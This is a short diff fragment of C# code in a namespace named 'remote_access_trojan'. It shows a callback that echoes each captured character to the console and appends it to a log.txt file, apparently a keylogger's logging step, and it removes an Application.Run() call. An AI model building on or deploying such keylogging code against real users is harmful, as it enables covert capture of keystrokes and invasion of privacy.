@@ -15,7 +15,6 @@ namespace remote_access_trojan
                 Console.Write(character);
                 File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), "log.txt"), character.ToString());
             });
-            Application.Run();
         }
     }
 }
